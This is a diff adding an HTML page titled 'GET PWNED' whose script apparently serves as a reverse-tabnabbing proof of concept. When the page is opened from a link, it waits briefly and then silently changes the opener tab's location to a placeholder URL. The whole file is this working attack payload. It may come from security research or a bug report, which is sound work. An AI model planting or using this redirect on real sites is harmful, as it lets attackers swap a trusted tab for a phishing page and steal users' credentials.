@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<head>
+    <title>GET PWNED</title>
+</head>
+<body>
+    <script>
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    async function try_move(){
+        if (window.opener) {
+            const sleep = ms => new Promise(r => setTimeout(r, ms));
+            await sleep(1 * 200);
+        window.opener.location = "markdown page url";
+        } else {
+            console.log(":(");
+        }
+    }
+    try_move();
+     </script>
+</body>
